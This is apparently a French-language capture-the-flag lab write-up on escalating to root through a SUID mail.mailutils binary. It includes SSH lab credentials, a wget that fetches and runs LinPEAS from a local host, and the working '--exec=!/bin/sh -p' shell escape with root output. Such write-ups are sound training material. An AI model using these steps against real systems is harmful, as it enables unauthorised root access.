# SUID Exploitation - Lab suid2

## Objectif
Exploiter un binaire SUID pour obtenir un accès root et récupérer le flag dans `/root`.

## Cible
- **Machine** : `10.10.3.32` (linux1)
- **User** : `exploit` / `PwnMe`
- **OS** : Ubuntu 20.04.6 LTS (Docker container)

---

## 1. Reconnaissance

### Connexion SSH
```bash
ssh exploit@10.10.3.32
```

### Enumération des binaires SUID
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Résultat :**
```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/mail.mailutils    <-- Candidat !
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

### Analyse avec LinPEAS
```bash
wget http://192.168.0.70:9999/linpeas.sh
bash linpeas.sh
```

LinPEAS confirme que `/usr/bin/mail.mailutils` est un **"Unknown SUID binary"** - une cible potentielle.

---

## 2. Fausses Pistes

### Tentative 1 : Shell escape basique
```bash
mail --exec='!/bin/sh'
$ id
uid=1000(exploit) gid=1000(exploit) groups=1000(exploit)
```
**Echec** : Le shell est lancé mais sans privilèges élevés (bash drop les privilèges SUID par défaut).

### Tentative 2 : Lecture directe de /etc/shadow
```bash
mail -f /etc/shadow
"/etc/shadow": 0 messages
```
**Echec** : mail.mailutils ne permet pas de lire directement des fichiers arbitraires de cette façon.

### Autres pistes explorées (sans succès)
- `/etc/mysql/my.cnf` - fichier lisible mais vide
- `/var/backups` - dossier vide
- `/etc/aliases.db` - Berkeley DB sans infos utiles
- Capabilities - aucune capability exploitable

---

## 3. Exploitation Réussie

### La clé : l'option `-p` de bash

Consulter [GTFOBins - mail](https://gtfobins.github.io/gtfobins/mail/) donne l'indice, mais il faut l'adapter.

Le problème : bash abandonne les privilèges SUID par défaut. L'option `-p` (privileged mode) **préserve l'euid**. 

```bash
mail --exec='!/bin/sh -p'
# id
uid=1000(exploit) gid=1000(exploit) euid=0(root) groups=1000(exploit)
```

**euid=0(root)** = Succès !

### Récupération du flag
```bash
# ls /root
flag1.txt
# cat /root/flag1.txt
```

---

## 4. Flag

```
FLAG{REDACTED}
```

---

## Ressources
- [GTFOBins - mail](https://gtfobins.github.io/gtfobins/mail/)
- [Bash -p option](https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html)
